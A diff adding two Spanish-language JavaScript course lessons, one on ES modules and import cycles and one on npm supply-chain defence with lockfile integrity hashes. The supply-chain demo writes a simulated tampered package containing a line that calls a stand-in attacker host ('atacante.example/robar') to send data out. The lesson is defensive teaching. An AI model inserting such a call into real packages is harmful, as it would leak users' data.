@@ -689,6 +689,296 @@ Ahora puedes distinguir bundling de transformación y defender una herramienta m
 
 **Transferencia al proyecto integrador «Seguimiento público accesible»:** Compara el artefacto del widget con la configuración de bundling elegida. Verifica navegadores objetivo y source maps, justificando cada transformación por un requisito de compatibilidad.
 
+### Tema 7: Módulos ES a fondo: top-level await, ciclos de importación e import maps · Avanzado · 45 min
+
+**Prerrequisito:** temas «ESM frente a CommonJS» e «import() dinámico e import.meta» de este módulo.
+
+**Al finalizar podrás:** usar `await` fuera de una función en un módulo, explicar por qué un ciclo de importación puede fallar y mapear nombres de paquetes a URLs en el navegador con un import map.
+
+**¿Por qué es importante?** Los módulos ES tienen reglas de carga propias. Si no las conoces, aparecen errores como «Cannot access before initialization» que parecen aleatorios, o configuraciones que bloquean el arranque de toda la aplicación.
+
+#### Paso 1 · Objetivo y preparación
+
+Vas a crear cinco archivos pequeños y ejecutarlos con Node.js 22 o superior. Crea la carpeta `academia-labs/javascript/esm-a-fondo`. Todos los archivos usan la extensión `.mjs`, así Node los trata como módulos ES sin tocar `package.json`.
+
+#### Paso 2 · Contexto y caso real
+
+RutaFlow carga su configuración (la región de operación) desde un archivo antes de calcular rutas. Además, el módulo de rutas y el de paradas se importan entre sí. Ese ciclo funciona hasta que alguien lee una variable del otro módulo durante la carga, y entonces el arranque se rompe en producción.
+
+#### Paso 3 · Teoría, modelo mental y analogía
+
+**Conceptos clave:** grafo de módulos, evaluación en orden, top-level await, ciclo de importación, zona muerta temporal (TDZ), import map.
+
+Antes de ejecutar nada, el motor lee todos los `import` y arma un **grafo de módulos**. Luego evalúa cada módulo una sola vez, empezando por las hojas: un módulo se ejecuta después de los módulos que importa.
+
+- **Top-level await:** un módulo puede usar `await` en su nivel superior. Los módulos que lo importan esperan a que termine. Es útil para cargar configuración, pero una espera larga retrasa todo el arranque.
+- **Ciclo de importación:** si `a.mjs` importa `b.mjs` y `b.mjs` importa `a.mjs`, uno de los dos se evalúa primero. Mientras tanto, las variables `const` y `let` del otro todavía no existen (están en la zona muerta temporal). Leerlas durante la carga lanza `ReferenceError`; leerlas después, dentro de una función, funciona.
+- **Import map:** en el navegador, `import { x } from 'rutas-util'` falla porque el navegador no sabe dónde está `rutas-util`. Un `<script type="importmap">` le dice a qué URL corresponde cada nombre. Node no usa import maps: resuelve con `node_modules` y `package.json`.
+
+**Analogía:** el grafo de módulos es una lista de compras con dependencias: no cocinas la salsa antes de tener los tomates. En un ciclo, dos recetas se piden mutuamente; puedes empezar una, pero no usar el resultado de la otra hasta que esté lista. La analogía falla en que el motor no espera a la otra receta: si la usas antes, lanza un error.
+
+**Límite de uso:** no uses top-level await para operaciones lentas o que pueden colgarse (por ejemplo, una petición de red sin tiempo límite): bloquea a todos los módulos que dependen de ese. Un ciclo de importación es una señal de diseño; muchas veces conviene mover lo compartido a un tercer módulo.
+
+```mermaid
+flowchart LR
+    M["main.mjs"] --> C["config.mjs<br/>top-level await"]
+    M --> A["a.mjs"]
+    A --> B["b.mjs"]
+    B -. "ciclo: lee a.mjs solo dentro de funciones" .-> A
+    C --> J["config.json"]
+```
+
+#### Paso 4 · Demostración guiada desde cero
+
+Archivo `academia-labs/javascript/esm-a-fondo/config.json`:
+
+```json
+{ "region": "bogota" }
+```
+
+Archivo `academia-labs/javascript/esm-a-fondo/config.mjs`:
+
+```js
+import { readFile } from 'node:fs/promises';
+
+// Top-level await: quien importe este módulo espera a que el archivo se lea.
+const texto = await readFile(new URL('./config.json', import.meta.url), 'utf8');
+export const config = JSON.parse(texto);
+```
+
+Archivo `academia-labs/javascript/esm-a-fondo/a.mjs`:
+
+```js
+import { nombreB } from './b.mjs';
+
+export const nombreA = 'A';
+export function saludar() {
+  return `A conoce a ${nombreB()}`;
+}
+```
+
+Archivo `academia-labs/javascript/esm-a-fondo/b.mjs`:
+
+```js
+import { nombreA } from './a.mjs';
+
+export function nombreB() {
+  return 'B';
+}
+
+// Seguro: nombreA se lee cuando alguien llama la función, no durante la carga.
+export function quienEsA() {
+  return nombreA;
+}
+```
+
+Archivo `academia-labs/javascript/esm-a-fondo/main.mjs`:
+
+```js
+import { config } from './config.mjs';
+import { saludar } from './a.mjs';
+import { quienEsA } from './b.mjs';
+
+console.log(`Región: ${config.region}`);
+console.log(saludar());
+console.log(`B lee a A después de evaluar: ${quienEsA()}`);
+```
+
+Archivo `academia-labs/javascript/esm-a-fondo/index.html`:
+
+```html
+<!-- Solo para el navegador: Node no lee import maps. -->
+<script type="importmap">
+  { "imports": { "rutas-util": "/vendor/rutas-util/index.js" } }
+</script>
+<script type="module">
+  import { version } from 'rutas-util'; // el import map traduce el nombre a la URL
+  console.log(version);
+</script>
+```
+
+Ejecuta el programa de Node desde la carpeta del ejemplo:
+
+```bash
+cd academia-labs/javascript/esm-a-fondo
+node main.mjs
+```
+
+**Explicación por bloques:** `config.mjs` usa `await` sin función: `main.mjs` no continúa hasta que el JSON está leído. `a.mjs` y `b.mjs` forman un ciclo. Como `a.mjs` importa `b.mjs`, el motor evalúa primero `b.mjs`; en ese momento `nombreA` todavía no existe, pero `b.mjs` no lo lee durante la carga, solo dentro de `quienEsA()`. Cuando `main.mjs` llama esa función, los dos módulos ya terminaron de evaluarse. `index.html` muestra el import map: el navegador cambia `rutas-util` por la URL `/vendor/rutas-util/index.js`.
+
+![Captura de terminal: node main.mjs imprime la región bogota, el saludo de A a B y que B lee a A después de evaluar](content/figures/javascript/esm-a-fondo.svg)
+
+**Resultado esperado:**
+
+```text
+Región: bogota
+A conoce a B
+B lee a A después de evaluar: A
+```
+
+**Fallo deliberado:** agrega al final de `b.mjs` la línea `console.log(nombreA);`, fuera de cualquier función. **Error esperado:** `ReferenceError: Cannot access 'nombreA' before initialization`. **Diagnóstico:** `b.mjs` se evalúa antes que `a.mjs` y lee una constante que todavía está en la zona muerta temporal. Mueve la lectura a una función o saca lo compartido a un tercer módulo.
+
+#### Paso 5 · Práctica guiada
+
+1. **Reproducción:** cambia la región en `config.json` y confirma que la primera línea cambia.
+2. **Variación:** agrega en `config.mjs` un `await new Promise(r => setTimeout(r, 2000))` y observa que todo el programa tarda dos segundos más en imprimir.
+3. **Diagnóstico:** reproduce el fallo deliberado y explica, con el orden de evaluación, por qué ocurre.
+4. **Integración:** rompe el ciclo creando `nombres.mjs` con `nombreA` y `nombreB`, e impórtalo desde `a.mjs` y `b.mjs`.
+5. **Diseño:** sirve `index.html` con `npx serve` y una carpeta `vendor/rutas-util/index.js` que exporte `version`; comprueba en la consola del navegador que el import map funciona.
+
+**Pista:** si un error dice «before initialization» y hay un ciclo, busca qué módulo lee una variable del otro fuera de una función.
+
+#### Paso 6 · Práctica independiente
+
+Escribe `secretos.mjs`, que con top-level await lea `secretos.json` y falle con un mensaje claro si el archivo no existe. Luego impórtalo desde `main.mjs` y demuestra que, si falla, ningún otro módulo llega a ejecutarse.
+
+#### Paso 7 · Cierre
+
+- [ ] Explicas en qué orden se evalúan `main.mjs`, `a.mjs` y `b.mjs`.
+- [ ] `node main.mjs` imprime las tres líneas esperadas.
+- [ ] Reprodujiste el `ReferenceError` del ciclo y lo corregiste.
+- [ ] Explicas por qué Node no usa import maps y el navegador sí.
+
+Si fallas dos o más, vuelve al Paso 3. **Errores comunes:** leer variables de un módulo del ciclo durante la carga, usar top-level await para peticiones sin tiempo límite y esperar que Node lea un import map. **Siguiente paso:** el tema «package.json — exports, type y scripts» controla qué rutas de un paquete se pueden importar.
+
+**Transferencia al proyecto integrador «RutaFlow»:** en RutaFlow, carga la configuración de región con top-level await en un único módulo `config.mjs` y revisa con `npx madge --circular src` que no queden ciclos entre `rutas` y `paradas`.
+
+**Fuente oficial:** [MDN — Módulos de JavaScript](https://developer.mozilla.org/es/docs/Web/JavaScript/Guide/Modules) y [MDN — script type="importmap"](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap).
+
+### Tema 8: Cadena de suministro npm: lockfile, integridad y paquetes alterados · Avanzado · 45 min
+
+**Prerrequisito:** tema «package.json — exports, type y scripts» de este módulo.
+
+**Al finalizar podrás:** explicar cómo npm detecta un paquete alterado con el campo `integrity` del lockfile, comprobarlo con `node:crypto` y aplicar las defensas básicas de la cadena de suministro.
+
+**¿Por qué es importante?** Casi todo el código de una aplicación JavaScript viene de paquetes de terceros. Un paquete comprometido corre con los mismos permisos que tu código. Saber qué protege el lockfile y qué no protege evita confiar de más.
+
+#### Paso 1 · Objetivo y preparación
+
+Usa Node.js 18 o superior y una terminal. Crea la carpeta `academia-labs/javascript/cadena-suministro`. El ejemplo simula la publicación y la instalación sin descargar nada, así puedes alterar un paquete sin riesgo.
+
+#### Paso 2 · Contexto y caso real
+
+Un paquete pequeño que RutaFlow usa para formatear rutas cambió de dueño y su nueva versión envió variables de entorno a un servidor externo. El equipo se salvó porque instalaba con `npm ci`: el hash del lockfile no coincidía con el archivo descargado.
+
+#### Paso 3 · Teoría, modelo mental y analogía
+
+**Conceptos clave:** lockfile, `integrity` (Subresource Integrity), `npm ci`, `npm audit`, scripts de instalación, procedencia (*provenance*).
+
+Cuando instalas un paquete, `package-lock.json` guarda su versión exacta y un campo `integrity`: el hash SHA-512 del archivo `.tgz`, escrito como `sha512-` seguido del hash en Base64. Con `npm ci`, npm descarga el archivo, calcula su hash y lo compara. Si no coincide, **rechaza la instalación**.
+
+El lockfile protege contra un archivo alterado **después** de que lo registraste. No protege si la versión que registraste ya era maliciosa. Para eso hay otras capas:
+
+| Riesgo | Defensa |
+|---|---|
+| Archivo cambiado en el camino o en el registro | `integrity` del lockfile y `npm ci` |
+| Vulnerabilidad conocida en una dependencia | `npm audit` y actualizaciones revisadas |
+| Script que se ejecuta al instalar | `npm ci --ignore-scripts` y revisar `postinstall` |
+| Paquete publicado desde una máquina comprometida | firmas y procedencia: `npm audit signatures` |
+
+**Analogía:** el lockfile es la foto de cada caja que recibiste: si mañana llega una caja con el mismo nombre pero otro peso, la rechazas. La analogía falla en que la foto no dice si el contenido original era bueno; solo que no cambió.
+
+**Límite de uso:** el hash no detecta un paquete malicioso desde su primera versión ni un error en tu propio código. `npm audit` solo conoce vulnerabilidades ya reportadas.
+
+```mermaid
+flowchart LR
+    P["npm publish<br/>rutas-util 1.0.0"] --> R["Registro npm"]
+    R -->|.tgz| I["npm ci"]
+    L["package-lock.json<br/>integrity sha512-..."] --> I
+    I -->|hash coincide| OK["instala"]
+    I -->|hash distinto| NO["rechaza: EINTEGRITY"]
+```
+
+#### Paso 4 · Demostración guiada desde cero
+
+Archivo `academia-labs/javascript/cadena-suministro/preparar.mjs`:
+
+```js
+import { createHash } from 'node:crypto';
+import { writeFile } from 'node:fs/promises';
+
+// Simula la publicación: el paquete original y una copia alterada.
+const contenido = 'export const version = "1.0.0";\n';
+await writeFile('rutas-util-1.0.0.tgz', contenido);
+await writeFile('rutas-util-alterado.tgz', contenido + 'fetch("https://atacante.example/robar");\n');
+
+// Simula la primera instalación: npm guarda el hash en el lockfile.
+const integrity = 'sha512-' + createHash('sha512').update(contenido).digest('base64');
+const lock = { lockfileVersion: 3, packages: { 'node_modules/rutas-util': { version: '1.0.0', integrity } } };
+await writeFile('package-lock.json', JSON.stringify(lock, null, 2));
+console.log(`lockfile registrado con ${integrity.slice(0, 20)}…`);
+```
+
+Archivo `academia-labs/javascript/cadena-suministro/verificar-integridad.mjs`:
+
+```js
+import { createHash } from 'node:crypto';
+import { readFile } from 'node:fs/promises';
+
+function integridad(bytes) {
+  return 'sha512-' + createHash('sha512').update(bytes).digest('base64');
+}
+
+const lock = JSON.parse(await readFile('package-lock.json', 'utf8'));
+const esperado = lock.packages['node_modules/rutas-util'].integrity;
+
+// Lo mismo que hace npm ci con cada archivo descargado.
+for (const archivo of ['rutas-util-1.0.0.tgz', 'rutas-util-alterado.tgz']) {
+  const real = integridad(await readFile(archivo));
+  const veredicto = real === esperado ? 'coincide' : 'NO coincide, npm rechazaría la instalación';
+  console.log(`${archivo}: ${veredicto}`);
+}
+```
+
+Ejecútalo:
+
+```bash
+cd academia-labs/javascript/cadena-suministro
+node preparar.mjs
+node verificar-integridad.mjs
+```
+
+**Explicación por bloques:** `preparar.mjs` hace dos cosas que en la vida real hace npm: guarda el paquete y, en la primera instalación, escribe su hash en `package-lock.json`. La copia alterada tiene una línea extra que envía datos a otro servidor. `verificar-integridad.mjs` repite la comprobación de `npm ci`: calcula el SHA-512 de cada archivo y lo compara con el lockfile. Basta un byte distinto para que el hash cambie por completo.
+
+![Captura de terminal: el lockfile registra el hash sha512 y el paquete alterado no coincide](content/figures/javascript/cadena-suministro-npm.svg)
+
+**Resultado esperado:**
+
+```text
+lockfile registrado con sha512-nnu+uJngDBWve…
+rutas-util-1.0.0.tgz: coincide
+rutas-util-alterado.tgz: NO coincide, npm rechazaría la instalación
+```
+
+**Fallo deliberado:** borra `package-lock.json` y vuelve a ejecutar `node preparar.mjs`, pero esta vez cambia `contenido` por el texto alterado antes de calcular el hash. **Error esperado:** ahora el archivo alterado «coincide». **Diagnóstico:** el lockfile solo protege lo que registraste; si registraste una versión mala, la confirma. Por eso también necesitas `npm audit`, revisar cambios de dueño y procedencia.
+
+#### Paso 5 · Práctica guiada
+
+1. **Reproducción:** ejecuta los dos scripts y copia el hash completo del lockfile.
+2. **Variación:** cambia un solo espacio del paquete original y comprueba que el hash cambia por completo.
+3. **Diagnóstico:** reproduce el fallo deliberado y explica qué riesgo no cubre el lockfile.
+4. **Integración:** en un proyecto real, ejecuta `npm ci --ignore-scripts` y `npm audit --omit=dev`, y anota qué encontró cada uno.
+5. **Diseño:** escribe una política de dependencias de cinco líneas para RutaFlow: quién aprueba paquetes nuevos y cómo se actualizan.
+
+**Pista:** pregúntate en qué momento se registró el hash: el lockfile solo compara contra ese momento.
+
+#### Paso 6 · Práctica independiente
+
+En un proyecto con dependencias reales, busca en `package-lock.json` un paquete y su `integrity`. Descarga el `.tgz` con `npm pack <paquete>@<versión>` y comprueba con tu script que el hash coincide.
+
+#### Paso 7 · Cierre
+
+- [ ] Explicas qué guarda el campo `integrity` y quién lo comprueba.
+- [ ] Los scripts imprimen las tres líneas esperadas.
+- [ ] Reprodujiste el caso en que el lockfile confirma una versión mala.
+- [ ] Nombras una defensa para cada fila de la tabla de riesgos.
+
+Si fallas dos o más, vuelve al Paso 3. **Errores comunes:** usar `npm install` en CI en lugar de `npm ci`, no versionar el lockfile y confiar en que `npm audit` sin hallazgos significa «seguro». **Siguiente paso:** el módulo 13 trata los datos no confiables y la seguridad en el navegador.
+
+**Transferencia al proyecto integrador «RutaFlow»:** en el CI de RutaFlow, instala con `npm ci --ignore-scripts`, ejecuta `npm audit --audit-level=high` y `npm audit signatures`, y falla el pipeline si alguno falla.
+
+**Fuente oficial:** [npm Docs — package-lock.json](https://docs.npmjs.com/cli/v11/configuring-npm/package-lock-json) y [npm Docs — npm audit](https://docs.npmjs.com/cli/v11/commands/npm-audit).
+
 ## Construcción guiada del capítulo
 
 **Objetivo del laboratorio:** construir un proyecto multi-módulo con Vite, comparar ESM con CommonJS, y auditar el bundle de producción resultante.
